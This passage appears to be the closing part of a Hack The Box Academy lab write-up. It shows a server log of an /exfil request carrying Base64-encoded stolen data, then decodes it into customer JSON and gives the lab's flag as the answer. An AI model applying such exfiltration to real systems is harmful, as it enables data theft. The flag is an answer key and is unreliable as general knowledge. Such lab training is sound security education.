10.129.187.237 - - [29/Jan/2025 01:27:26] "GET /exfil?r=eyJjdXN0b21lciI6eyJhZGRyZXNzIjoiSFRCe2U3NTNhN2RiNmU0ZTIzMDE1ZDg5ZWY5ZmExZWNmMGY2fSIsIm5hbWUiOiIyIn19Cg== HTTP/1.1" 404 -
```

Decoding the Base64 encoded response unveils the flag:

```shell
echo eyJjdXN0b21lciI6eyJhZGRyZXNzIjoiSFRCe2U3NTNhN2RiNmU0ZTIzMDE1ZDg5ZWY5ZmExZWNmMGY2fSIsIm5hbWUiOiIyIn19Cg== | base64 -d
```
```
┌─[eu-academy-5]─[10.10.14.64]─[htb-ac-8414@htb-5ixo9dqyuj]─[~]
└──╼ [★]$ echo eyJjdXN0b21lciI6eyJhZGRyZXNzIjoiSFRCe2U3NTNhN2RiNmU0ZTIzMDE1ZDg5ZWY5ZmExZWNmMGY2fSIsIm5hbWUiOiIyIn19Cg== | base64 -d

{"customer":{"address":"HTB{e753a7db6e4e23015d89ef9fa1ecf0f6}","name":"2"}}
```

Answer: `HTB{e753a7db6e4e23015d89ef9fa1ecf0f6}`